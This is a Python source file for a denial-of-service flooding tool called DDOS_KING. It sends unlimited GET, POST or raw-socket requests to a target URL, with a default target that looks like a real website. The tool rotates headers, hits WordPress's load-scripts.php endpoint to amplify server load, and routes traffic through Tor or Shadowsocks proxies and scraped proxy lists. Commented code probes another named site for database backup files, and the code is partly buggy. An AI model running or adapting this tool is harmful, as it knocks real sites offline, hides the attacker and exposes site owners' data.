#!/usr/bin/env python
# -*- coding:utf-8 -*-

import argparse
import logging
import random
import re
import socket
import sys
import time
import urllib.request as request

import numpy as np
import requests
import socks
from retry import retry

#import win_inet_pton
logger = logging.getLogger(__name__)


class DDOS_KING(object):
	def __init__(self,CONCURRENCY_TYPE,PROXY_TYPE):
		self.CONCURRENCY_TYPE=CONCURRENCY_TYPE
		self.TYPE=self.request_counter=self.TIMEOUT=self.CHECK_TIME=0
		self.payload=self.url=self.additionalHeaders=self.SOCKET_DATA=self.proxies=''
		# with open('C:/Documents and Settings/Administrator/桌面/referer.txt','r',encoding='utf-8') as get_referer_list:
		# 	self.referer_list=np.array([get_referer_list.readline()])
		# with open ('C:/Documents and Settings/Administrator/桌面/headers.txt','r',encoding='utf-8') as headers_list:
		# 	self.headers_useragents=np.array([headers_list.readline()])
		self.headers_useragents=[
		'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
		'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
		'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US'
		]
		self.referer_list=['https://www.baidu.com/s?wd=',
		'https://www.so.com/s?ie=utf-8&fr=360chrome_toolbar_search&src=home_www&q=',
		'http://www.sogou.com/tx?ie=utf8&pid=&query=',
		'http://www.yodao.com/search?q=']
		self.printedMsgs =self.ip_list=[]
		self.Tor_Proxies,self.SS_Proxies={"http": "socks5://127.0.0.1:9050",'https': 'socks5://127.0.0.1:9050'},{ "http": "socks5://127.0.0.1:1080",'https': 'socks5://127.0.0.1:1080'}
		# if PROXY_TYPE:self.proxies=''
		# elif PROXY_TYPE==2:self.proxies=self.Tor_Proxies
		# else:self.proxies=self.SS_Proxies
		self.is_wordpress=self.is_socket_mode=False
		self.headers = {
					'Accept-Encoding': 'gzip, deflate, sdch',
					'Accept-language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4',
					'Cache-Control': 'no-cache',
					'Connection': 'keep-alive',
					}
	def GET_IP_LIST(self):
		headers=''
		with open('C:/Documents and Settings/Administrator/桌面/ip_add_list.txt','r',encoding='utf-8') as ip_add_list:
			for i in ip_add_list:
				@retry(tries=3)
				def GET():
					try:
						#print(i.strip())
						if 'prox' in i:self.proxies=self.SS_Proxies
						global headers
						if headers:print(headers)
						if self.proxies:print(self.proxies)
						res=requests.get(i.strip(),timeout=7,headers=headers,proxies=self.proxies)
						if self.proxies!='':self.proxies=''
					except Exception as e:
						self.proxies=self.SS_Proxies
						headers={
						'User-Agent':random.choice(self.headers_useragents).encode('utf-8').decode('utf-8-sig').strip(),
						'Accept-Encoding': 'gzip, deflate, sdch',
						'Accept-language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4',
						'Referer':i.strip(),
						'Connection': 'close'
						}
						if 'SOCKSHTTP' not in str(e):raise Exception
						else:pass
					else:
						if res.status_code ==200:
							list=re.findall(r'(?:((?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5]))\D+?(6[0-5]{2}[0-3][0-5]|[1-5]\d{4}|[1-9]\d{1,3}|[0-9]))', res.text)
							if list:self.ip_list.append(list)
				GET()
		self.CHECK_IP_LIST()
		with open('C:/Documents and Settings/Administrator/桌面/ip_list.txt','a',encoding='utf-8') as ip_save_list:
			for i in self.ip_list:
				ip_save_list.write(str(i).replace("', '",':').replace("'",'').replace(',','').replace('[','').replace(']','').replace('(','').replace(')',''))
				ip_save_list.write('\n')

	def CHECK_IP_LIST(self):
		def CHECK(list):
			for i in list:
				if not self.CHECK_IP(i): ip_list.remove(i)
		if not self.ip_list:
			with open('C:/Documents and Settings/Administrator/桌面/ip_list.txt','r',encoding='utf-8') as get_referer_list:
				ip_list=np.array([get_referer_list.readline()])
				CHECK(list)
		else:
			CHECK(self.ip_list)


	def CHECK_IP(self,IP):
		if  requests.get('http://cocbus.com/ip',proxies={"http": str(IP),'https': str(IP)},timeout=7).status_code ==200:
			print('此IP有效!')
			return True

	def printMsg(self,msg):
		if msg not in self.printedMsgs:
			print ("\n"+msg + 'after '+str(self.request_counter)+'requests')
			self.printedMsgs.add(msg)

	def randomString(self,size):
		out_str = ''
		for i in range(0, size):
			a = random.randint(65, 90)
			out_str += chr(a)
		return(out_str)

	def initHeaders(self):
		if random.randint(1,2) == 1:self.headers['Referer']=self.url
		else:self.headers['Referer']=random.choice(self.referer_list).encode('utf-8').decode('utf-8-sig').strip()+self.randomString(random.randint(5,10))
		self.headers['Keep-Alive'] = str(random.randint(110,120))
		self.headers['User-Agent'] =random.choice(self.headers_useragents).encode('utf-8').decode('utf-8-sig').strip()
		if self.additionalHeaders:
			for header in self.additionalHeaders:
				headers.update({header.split(":")[0]:header.split(":")[1]})
		return self.headers

	@retry(tries=3)
	def sendGET(self):
		if self.is_wordpress:self.url+='/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9'
		#request_session=requests.Session()
		@retry(tries=3)
		def TRY():
			try:
				request = requests.get(self.url,headers=self.initHeaders(),proxies=self.proxies,timeout=self.TIMEOUT)
			except Exception as e:
				logger.error(str(e)+'\n')
			else:
				self.request_counter+=1
				sys.stdout.write("\r%i requests has been sent" %self.request_counter)
				sys.stdout.flush()
				if self.request_counter%self.CHECK_TIME==0:
					sys.stdout.write('\n正在检测状态码\rstatus_code is :%i'% request.status_code)
					if  request.status_code == 500 or 502 or 504:
						print("Status code "+str( request.status_code)+" received")
						time.sleep(9)
					elif request.status_code == 503:
						self.printMsg("This site were be protect")#protect
						time.sleep(10)
					if request.status_code == 429:self.printMsg("You have been throttled")
		while True:
			TRY()

	@retry(tries=3)
	def SOCKET_sendGET(self):
		PORT=80
		if 'http://'in self.url:self.url=self.url.replace('http://','')
		elif 'https' in self.url:
			PORT=443
			self.url=self.url.replace('https://','')
		self.is_wordpress=True
		self.SOCKET_DATA='GET / HTTP/1.1\r\nHost:'+self.url+'\r\nCache-Control:no-cache\r\nConnection:keep-alive\\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.9,en-CA;q=0.8,en;q=0.7\r\n\r\n'
		if self.is_wordpress:SOCKET_DATA=self.SOCKET_DATA.replace('T /','T /wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9')
		if self.proxies:
			socks.set_default_proxy(socks.HTTP,addr=self.proxies['http'][0:-5],port=self.proxies['http'][:-4])
			socket.socket = socks.socksocket
		#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		@retry(tries=3)
		def TRY():
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((self.url,PORT))
				sock.send(self.SOCKET_DATA.encode())
			except Exception as e:
				sock.close()
				logger.error(str(e)+'\n')
			else:
				# while True:
				# 	data = sock.recv(1024).decode()
				# 	if not data:break
				# 	print(data)
				self.request_counter+=1
				sys.stdout.write("\r%i SOCKET_requests has been sent" % self.request_counter)
				sys.stdout.flush()
				if self.request_counter%self.CHECK_TIME==0:
					status_code=sock.recv(100).decode().splitlines()[0][9:13]
					if status_code == 500 or 502 or 504:
						print("Status code "+str(status_code)+" received")
						time.sleep(5)
					elif status_code == 503:
						self.printMsg("This site were be protect")#protect
						time.sleep(10)
					elif status_code == 429:self.printMsg("You have been throttled")
					sys.stdout.write('\n正在检测状态码\rstatus_code is :%i'%status_code)
					sys.stdout.flush()
		while True:
			TRY()
	def sendPOST(self):
		if self.payload:
			EVAL='request = requests.post(self.url , data=self.initHeaders(), headers=headers,proxies=self.proxies)'
		else:
			EVAL='request = requests.post(self.url , headers=self.initHeaders(),proxies=self.proxies)'
		while True:
			try:
				exec(EVAL)
				self.handleStatusCodes(request.status_code)
			except Exception as e:
				logger.error(str(e)+'\n')
				pass
			else:
				self.request_counter=self.request_counter+1
				print(self.request_counter)
				sys.stdout.write(str(self.request_counter)+"\r requests has been sent" )
				sys.stdout.flush()
				if self.request_counter%self.CHECK_TIME==0:
					print('\n'+'正在检测状态码')
					if  request.status_code == 500 or 502 or 504:
						print("Status code "+str( request.status_code)+" received")
						time.sleep(9)
					elif request.status_code == 503:
						self.printMsg("This site were be protect")#protect
						time.sleep(10)
					if request.status_code == 429:self.printMsg("You have been throttled")
	# TODO:
	# check if the site stop responding and alert
	def main(self,argv):
		parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
		parser.add_argument('-c', help='Time count to check', default=100, type=int)
		parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'', default='http://www.djmeishi.club')
		parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
		parser.add_argument('-d', help='Specify data payload for POST request', default=None)
		parser.add_argument('-ah', help='Specify addtional header/s. Usage: -ah \'Content-type: application/json\' \'User-Agent: Doser\'', default=None, nargs='*')
		parser.add_argument('-t', help='Specify number of threads to be used', default=10, type=int)
		parser.add_argument('-T', help='TIMEOUT', default=7, type=int)
		parser.add_argument('-w', help='IS WORDPRESS', default=False, type=int)
		parser.add_argument('-s', help='IS SOCKET_MODE', default=False, type=int)
		parser.add_argument('-P', help='PROXY_MODE', default=0, type=int)
		args = parser.parse_args()
		self.additionalHeaders = args.ah

		if len(sys.argv)==1:
			parser.print_help()
			exit()
		else:
			if args.g:self.url = args.g
			else:self.url,self.payload = args.p,args.d
			if args.P:self.proxies=self.SS_Proxies
			elif args.P==2:self.proxies=self.Tor_Proxies
			self.CHECK_TIME,self.THREADS_NUM,self.TIMEOUT,self.is_wordpress,self.is_socket_mode=args.c,args.t,args.T,args.w,args.s
			self.AutoControl()
	def AutoControl(self):
		THIS_CONCURRENCY_TYPE={}
##################################################################
		if self.CONCURRENCY_TYPE==1:#stackless
			THIS_CONCURRENCY_TYPE['EVAL1']='stackless.tasklet(self.sendGET)()'
			THIS_CONCURRENCY_TYPE['EVAL2']='stackless.run()'
##################################################################
		elif self.CONCURRENCY_TYPE==2:#Thread
			THIS_CONCURRENCY_TYPE['EVAL1']='t=threading.Thread(target=self.sendGET)\nt.daemon = True\nt.start()'
			THIS_CONCURRENCY_TYPE['EVAL2']=''
##################################################################
		elif self.CONCURRENCY_TYPE==3:#multiprocessing
			from multiprocessing import Pool
			pool = Pool(self.THREADS_NUM)
			THIS_CONCURRENCY_TYPE['EVAL1']='pool.apply_async (self.sendGET, args=(QUEUE_INDEX))'
			THIS_CONCURRENCY_TYPE['EVAL2']='pool.close()\npool.join()'
##################################################################
		elif self.CONCURRENCY_TYPE==4:#gevent 
			pass
			#THIS_CONCURRENCY_TYPE['EVAL1']=
				# 		createVar = locals()
				# 		self.GREENLET_DEQUE=deque()
				# 		for i in range(self.THREADS_NUM):
				# 			Var_Index='G'+str(i)
				# 			self.GREENLET_DEQUE.append(Var_Index)
				# 			createVar[Var_Index]= gevent.gevent.(self.sendGET(self.CrackQueue[i]))
		if self.payload:THIS_CONCURRENCY_TYPE['EVAL1']=THIS_CONCURRENCY_TYPE['EVAL1'].replace('GET','POST')
		if self.is_socket_mode:THIS_CONCURRENCY_TYPE['EVAL1']=THIS_CONCURRENCY_TYPE['EVAL1'].replace('send','SOCKET_send')
		for i in range(self.THREADS_NUM):
			exec(THIS_CONCURRENCY_TYPE['EVAL1'])
		exec(THIS_CONCURRENCY_TYPE['EVAL2'])



	@retry(tries=3)
	def  Vidalia_Change_IP(self):
		import win32api,win32gui,win32con
		left=top=0
		def  change():
			win32api.SetCursorPos((left, top+231))
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0,0,0,0)
			time.sleep(0.05)
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0,0,0,0)
			time.sleep(0.1)
			win32api.SetCursorPos((left+10, top+100))
			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0,0,0,0)
			time.sleep(0.05)
			win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0,0,0,0)
		def check_exsit(process_name):
			import win32com.client
			if win32com.client.GetObject('winmgmts:').ExecQuery('select * from Win32_Process where Name="%s"' % process_name) : return True
		try:
			if not check_exsit('ViStart.exe'):
				print('ViStart.exe are not exsit')
				win32api.ShellExecute(0, 'open', r"D:/Program Files (x86)/Vidalia/Start Vidalia.exe", '','',1)
				time.sleep(40)
			VidaliaHwnd = win32gui.FindWindow('QPopup', 'vidalia')
			left, top, right, bottom = win32gui.GetWindowRect(VidaliaHwnd)
		except Exception as e:
			print("Has Exception:发生异常："+str(e))#if str(e)=="(2, 'FindWindow', '系统找不到指定的文件。')": if str(e)=="name 'VidaliaHwnd' is not defined":
			win32api.SetCursorPos((1783, 1063))#1773
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0,0,0,0)
			win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0,0,0,0)
			time.sleep(0.1)
			VidaliaHwnd = win32gui.FindWindow('QPopup', 'vidalia')
			left, top, right, bottom = win32gui.GetWindowRect(VidaliaHwnd)
			change()
		else:
			change()
if __name__ == '__main__' :
	DDOS_KING(1,1).main(sys.argv[1:])	
	# last=''
	# day=0
	# for i1 in range(9,20):
	# 	for i2 in range(1,13):
	# 		for i3 in range(0,9):
	# 			day=str(i1).zfill(2)+str(i2)+str(i3)
	# 			data='http://www.377y.com/dbback/20'+day[0:4]+'~1.asa'
	# 			print(data)
	# 			if requests.get(data).status_code!= 404:
	# 				print('找到备份!'+data)
	# 				sys.exit()

# 	def get_ipandport():
		# #默认网页内的IP地址位于端口号之前，并且中间至少隔了一个非数字的字符串
		# # (?:((?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5]))  用于匹配IP地址
		# # (6[0-5]{2}[0-3][0-5]|[1-5]\d{4}|[1-9]\d{1,3}|[0-9])	用于匹配端口号 注意端口号匹配规则应从大到校排序 
		# # 使用 ([0-9]|[1-9]\d{1,3}|[1-5]\d{4}|6[0-5]{2}[0-3][0-5]) 替换即可观察到原因。
		# # 使用\D+?匹配IP地址与端口号中间至少隔了一个非数字的字符串
		# p = r'(?:((?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5])\.(?:\d|[1-9]\d|1\d{2}|2[0-5][0-5]))\D+?(6[0-5]{2}[0-3][0-5]|[1-5]\d{4}|[1-9]\d{1,3}|[0-9]))'
		# iplist = re.findall(p,requests.get('http://www.ip3366.net/free/?stype=2&page=7',timeout=7).text)
		# for each in iplist:
		# print(each)
		# get_ipandport()